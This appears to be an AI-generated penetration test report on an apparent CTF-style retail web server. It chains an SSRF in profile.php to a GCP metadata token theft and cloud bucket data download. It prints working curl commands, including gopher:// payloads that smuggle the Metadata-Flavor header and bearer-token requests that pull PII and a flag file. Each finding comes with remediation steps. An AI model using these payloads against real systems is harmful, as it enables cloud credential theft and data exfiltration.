# Vulnerability Assessment Report — 35.226.245.121

**Classification:** CONFIDENTIAL — Restricted to authorized personnel  
**Generated:** 2026-08-02T16:49:32Z  
**Target:** 35.226.245.121  
**Campaign:** camp_20260802_656007d3  
**Methodology:** ISO 27001 / NIST SP 800-115 / MITRE ATT&CK  

---

## MANAGEMENT SUMMARY

> *For non-technical readers and decision-makers.*

### Overall Security Posture: 🔴 CRITICAL — Immediate Action Required

The system tested (**35.226.245.121**) presents an **extremely poor security posture**. Our team confirmed 3 critical and 1 high severity vulnerabilities, enabling complete compromise through multiple independent attack paths.

### Most Critical Issues

**1. Server-Side Request Forgery (SSRF) in profile.php**  
The profile.php endpoint accepts a user-supplied URL via the 'url' query parameter and fetches it server-side using PHP curl. When the fetched content is not a valid image, the raw fetched content is ...

**2. GCP Service Account Token Theft via SSRF Metadata Access**  
Via the gopher:// SSRF bypass on profile.php, the GCP instance metadata service was accessed at [REDACTED]-accounts/default/token. This returned a valid GCP access token (ya2...

**3. GCS Bucket Data Exfiltration - PII and Sensitive Data Exposed**  
Using the stolen GCP access token (ya29.*) obtained via SSRF-to-metadata-service exploitation, the Cloud Storage JSON API was used to enumerate and download all objects from the gigantic-retail GCS bu...

### Required Actions

| Timeframe | Action |
|-----------|--------|
| **Today** | Block external access / take offline if possible |
| **This week** | Patch all critical and high severity findings |
| **2 weeks** | Address medium severity findings and security headers |
| **1 month** | Full code review and independent re-test |

---

## 1. EXECUTIVE SUMMARY

> Critical SSRF vulnerability in Gigantic Retail's profile.php endpoint was exploited to access the GCP instance metadata service via a gopher:// protocol payload, bypassing the Metadata-Flavor: Google header requirement. A service account access token was stolen and used to enumerate and exfiltrate sensitive data from the gigantic-retail GCS bucket, including PII of 20 individuals and a flag file. The service account had overly permissive cloud-platform scope.

**Overall Risk Level: CRITICAL**

### Findings Summary

| Severity | Count | Exploited | Confirmed |
|----------|-------|-----------|----------|
| CRITICAL | 3 | 3 | 0 |
| HIGH | 1 | 0 | 1 |
| MEDIUM | 0 | 0 | 0 |
| LOW | 0 | 0 | 0 |
| INFO | 0 | 0 | 0 |
| **TOTAL** | **4** | **3** | **1** |

---

## 2. FINDINGS TABLE

| # | ID | Title | Severity | CVSS | Status | Endpoint |
|---|-----|-------|----------|------|--------|----------|
| 1 | `vuln_5322bf` | Server-Side Request Forgery (SSRF) in profile.php | CRITICAL | 9.8 | **EXPLOITED** | `35.226.245.121/profile.php?url=` |
| 2 | `vuln_335e63` | GCP Service Account Token Theft via SSRF Metadata ... | CRITICAL | 9.8 | **EXPLOITED** | `metadata.google.[REDACTED]...` |
| 3 | `vuln_782785` | GCS Bucket Data Exfiltration - PII and Sensitive D... | CRITICAL | 9.1 | **EXPLOITED** | `storage.googleapis.com/storage/v1/b/gigantic-retai...` |
| 4 | `vuln_428505` | Overly Permissive GCP Service Account - cloud-plat... | HIGH | 8.1 | Confirmed | `metadata.google.[REDACTED]...` |

---

## 3. VULNERABILITY DETAILS

---

### 3.1 — Server-Side Request Forgery (SSRF) in profile.php

| Field | Value |
|-------|-------|
| **ID** | `vuln_5322bf` |
| **Severity** | CRITICAL |
| **CVSS Score** | 9.8 |
| **CVSS Vector** | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` |
| **Status** | EXPLOITED |
| **Category** | `ssrf` |
| **MITRE ATT&CK** | `T1190` — Exploit Public-Facing Application |
| **ISO 27001** | `A.14.2.5` |
| **Endpoint** | `http://35.226.245.121/profile.php?url=` |
| **Component** | profile.php |
| **Discovered by** | `php` |
| **Discovered at** | 2026-08-02T16:45:34Z |

#### Description

The profile.php endpoint accepts a user-supplied URL via the 'url' query parameter and fetches it server-side using PHP curl. When the fetched content is not a valid image, the raw fetched content is displayed in a div.raw-content element. The application supports the gopher:// protocol scheme, allowing an attacker to send arbitrary raw TCP data to internal services. This was exploited to bypass the GCP metadata server's Metadata-Flavor: Google header requirement by crafting a gopher:// payload that smuggles a complete HTTP request with the required header.

#### Technical Analysis

The profile.php page has a profile picture feature that fetches a user-supplied URL server-side using PHP curl. When the URL does not return an image, the raw fetched content is echoed back in a div. The application supports gopher:// URLs, which allows sending raw TCP data. By crafting a gopher:// URL with a properly encoded HTTP request containing the Metadata-Flavor: Google header, we bypassed the GCP metadata server's header check and gained access to the instance metadata, including service account credentials with full cloud-platform scope.

#### Exploitation Commands

```bash
curl -s "http://35.226.245.121/profile.php?url=http://ifconfig.me" (SSRF verification - fetches external URL)
curl -s -G --data-urlencode "url=gopher://metadata.google.internal:80/_GET%20/computeMetadata/v1/%20HTTP/1.1%0d%0aHost:%20metadata.google.internal%0d%0aMetadata-Flavor:%20Google%0d%0a%0d%0a" "http://35.226.245.121/profile.php" (gopher SSRF bypass to access GCP metadata)
```

#### Evidence / Logs

```
1. Sent SSRF request to http://ifconfig.me - server fetched and returned content in raw-content div
2. Direct metadata access returned 403: "Missing Metadata-Flavor:Google header"
3. Crafted gopher:// payload to smuggle HTTP request with Metadata-Flavor: Google header
4. Successfully accessed metadata endpoint: GET /computeMetadata/v1/ returned instance/, oslogin/, project/
5. Enumerated service accounts: storage-service-account@gigantic-retail-project.iam.gserviceaccount.com
6. Service account has cloud-platform scope (full access)
```

#### Remediation

1. Implement URL scheme allowlisting - only permit http:// and https:// schemes, blocking gopher://, file://, dict://, etc. 2. Implement SSRF protection by blocking requests to internal IP ranges (169.254.169.254, 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16, and metadata.google.internal). 3. Use a dedicated image fetching library that validates content-type before processing. 4. Restrict the VM service account to least-privilege permissions instead of cloud-platform scope.

---

### 3.2 — GCP Service Account Token Theft via SSRF Metadata Access

| Field | Value |
|-------|-------|
| **ID** | `vuln_335e63` |
| **Severity** | CRITICAL |
| **CVSS Score** | 9.8 |
| **CVSS Vector** | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` |
| **Status** | EXPLOITED |
| **Category** | `ssrf` |
| **MITRE ATT&CK** | `T1552.005` — Unsecured Credentials: Cloud Instance Metadata API |
| **ISO 27001** | `A.9.4.1` |
| **Endpoint** | `http://metadata.google.[REDACTED]-ac...` |
| **Discovered by** | `gcp` |
| **Discovered at** | 2026-08-02T16:47:17Z |

#### Description

Via the gopher:// SSRF bypass on profile.php, the GCP instance metadata service was accessed at [REDACTED]-accounts/default/token. This returned a valid GCP access token (ya29.*) for the service account storage-service-account@gigantic-retail-project.iam.gserviceaccount.com with full cloud-platform scope. The token can be used to access any GCP API the service account has permissions for, including Cloud Storage, Compute Engine, etc.

#### Technical Analysis

By exploiting the SSRF vulnerability with a gopher:// protocol payload, we smuggled an HTTP request with the required Metadata-Flavor: Google header to the GCP instance metadata service. The /token endpoint returned a valid OAuth2 access token (ya29.*) for the attached service account. This token has cloud-platform scope, granting access to all GCP services the service account is authorized for.

#### Exploitation Commands

```bash
curl -s -G --data-urlencode "url=gopher://metadata.google.internal:80/_GET%[REDACTED]-accounts/default/token%20HTTP/1.1%0d%0aHost:%20metadata.google.internal%0d%0aMetadata-Flavor:%20Google%0d%0a%0d%0a" "http://35.226.245.121/profile.php"
```

#### Evidence / Logs

```
1. Crafted gopher:// SSRF payload targeting metadata token endpoint
2. Metadata server returned HTTP/1.1 200 OK with JSON containing access_token
3. Token format: ya29.c.c0AZ4bNp... (Bearer token, expires_in: 2612 seconds)
4. Service account: storage-service-account@gigantic-retail-project.iam.gserviceaccount.com
5. Scope: https://www.googleapis.com/auth/cloud-platform (full access)
6. Project ID: gr-proj-1
```

#### Remediation

1. Apply least-privilege to the VM service account - remove cloud-platform scope and only grant specific required permissions. 2. Use Workload Identity instead of VM-attached service accounts where possible. 3. Enable OS Login and disable legacy metadata endpoints. 4. Use VM metadata shields (custom metadata attributes) to restrict metadata access. 5. Consider using Google's metadata concealment to protect against SSRF-based metadata access.

---

### 3.3 — GCS Bucket Data Exfiltration - PII and Sensitive Data Exposed

| Field | Value |
|-------|-------|
| **ID** | `vuln_782785` |
| **Severity** | CRITICAL |
| **CVSS Score** | 9.1 |
| **CVSS Vector** | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N` |
| **Status** | EXPLOITED |
| **Category** | `ssrf` |
| **MITRE ATT&CK** | `T1530` — Data from Cloud Storage |
| **ISO 27001** | `A.8.2.3` |
| **Endpoint** | `https://storage.googleapis.com/storage/v1/b/gigantic-retail/o` |
| **Discovered by** | `gcp` |
| **Discovered at** | 2026-08-02T16:49:05Z |

#### Description

Using the stolen GCP access token (ya29.*) obtained via SSRF-to-metadata-service exploitation, the Cloud Storage JSON API was used to enumerate and download all objects from the gigantic-retail GCS bucket. The bucket contained: 1) userdata/user_data.csv with PII of 20 individuals (names, addresses, phone numbers, emails, employers), 2) userdata/flag.txt containing a CTF flag (9cee2dec5c28e047022f8ba9e0d7ca62), 3) shop/ and images/ directories with retail images. The service account storage-service-account@gigantic-retail-project.iam.gserviceaccount.com has excessive permissions (cloud-platform scope) allowing full bucket access.

#### Technical Analysis

After stealing the GCP service account access token via SSRF, the token was used as a Bearer authorization header against the Google Cloud Storage JSON API. The gigantic-retail bucket was successfully enumerated, revealing a userdata/ directory containing sensitive customer PII (user_data.csv) and a flag file (flag.txt). The PII includes 20 individuals' full names, physical addresses, phone numbers, email addresses, job titles, and employer companies - constituting a significant data breach.

#### Exploitation Commands

```bash
curl -s -H "Authorization: Bearer <stolen_token>" "https://storage.googleapis.com/storage/v1/b/gigantic-retail/o"
curl -s -H "Authorization: Bearer <stolen_token>" "https://storage.googleapis.[REDACTED]-retail/o/userdata%2Fflag.txt?alt=media"
curl -s -H "Authorization: Bearer <stolen_token>" "https://storage.googleapis.[REDACTED]-retail/o/userdata%2Fuser_data.csv?alt=media"
```

#### Evidence / Logs

```
1. Used stolen Bearer token against GCS JSON API: GET /storage/v1/b/gigantic-retail/o
2. Bucket listing returned 14 objects across 3 directories: images/, shop/, userdata/
3. Downloaded userdata/flag.txt: 9cee2dec5c28e047022f8ba9e0d7ca62
4. Downloaded userdata/user_data.csv: 20 PII records (Name, Address, Phone, Email, Job, Company)
5. Sample PII: John Doe, 123 Main St Seattle WA, 555-1234, john.doe@email.com, Software Engineer, Nova Software Solutions
```

#### Remediation

1. Apply least-privilege IAM policies to the service account - restrict to only required buckets and operations. 2. Remove cloud-platform scope from the VM; use specific storage scopes instead. 3. Enable VPC Service Controls to prevent data exfiltration. 4. Implement Cloud DLP to classify and protect PII data in buckets. 5. Enable GCS bucket-level access control instead of uniform bucket-level access. 6. Store PII data encrypted with customer-managed encryption keys (CMEK). 7. Enable Cloud Audit Logs and set up alerts for unusual bucket access patterns.

---

### 3.4 — Overly Permissive GCP Service Account - cloud-platform Scope

| Field | Value |
|-------|-------|
| **ID** | `vuln_428505` |
| **Severity** | HIGH |
| **CVSS Score** | 8.1 |
| **CVSS Vector** | `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N` |
| **Status** | CONFIRMED |
| **Category** | `misconfiguration` |
| **MITRE ATT&CK** | `T1078.004` — Valid Accounts: Cloud Accounts |
| **ISO 27001** | `A.9.2.3` |
| **Endpoint** | `http://metadata.google.[REDACTED]-ac...` |
| **Discovered by** | `gcp` |
| **Discovered at** | 2026-08-02T16:49:18Z |

#### Description

The GCP Compute Engine VM instance is configured with the service account storage-service-account@gigantic-retail-project.iam.gserviceaccount.com using the cloud-platform scope (https://www.googleapis.com/auth/cloud-platform). This grants the service account full access to all GCP APIs, violating the principle of least privilege. Combined with the SSRF vulnerability, this allows an attacker who can access the metadata service to obtain a token with broad GCP access.

#### Technical Analysis

The VM's attached service account has cloud-platform scope, which is the broadest scope available in GCP. This means any token minted from the metadata service grants full access to all GCP APIs the service account's IAM roles allow. For a service account named 'storage-service-account', it should only need specific storage-related scopes.

#### Exploitation Commands

```bash
curl -s -G --data-urlencode "url=gopher://metadata.google.internal:80/_GET%[REDACTED]-accounts/default/scopes%20HTTP/1.1%0d%0aHost:%20metadata.google.internal%0d%0aMetadata-Flavor:%20Google%0d%0a%0d%0a" "http://35.226.245.121/profile.php"
```

#### Evidence / Logs

```
1. Queried metadata service for service account scopes
2. Response: https://www.googleapis.com/auth/cloud-platform
3. This is the broadest possible scope - grants access to ALL GCP APIs
4. Service account: storage-service-account@gigantic-retail-project.iam.gserviceaccount.com
5. Project: gr-proj-1
```

#### Remediation

1. Replace cloud-platform scope with specific scopes: devstorage.read_only or devstorage.read_write. 2. Apply least-privilege IAM roles to the service account. 3. Consider using Workload Identity or separate service accounts for different application functions. 4. Regularly audit service account permissions using IAM Policy Analyzer.

---

## 4. REMEDIATION ROADMAP

### P0 — Immediate (< 24h)

| Finding | Effort |
|---------|--------|
| Server-Side Request Forgery (SSRF) in profile.php | High |
| GCP Service Account Token Theft via SSRF Metadata Access | High |
| GCS Bucket Data Exfiltration - PII and Sensitive Data Expose... | High |

### P1 — Short term (< 1 week)

| Finding | Effort |
|---------|--------|
| Overly Permissive GCP Service Account - cloud-platform Scope | High |

---

*Report auto-generated by Darkmoon AI Security Platform*  
*Classification: CONFIDENTIAL — Restricted to authorized personnel*  
*Generated: 2026-08-02T16:49:32Z*  
*Campaign: camp_20260802_656007d3 | Target: 35.226.245.121*
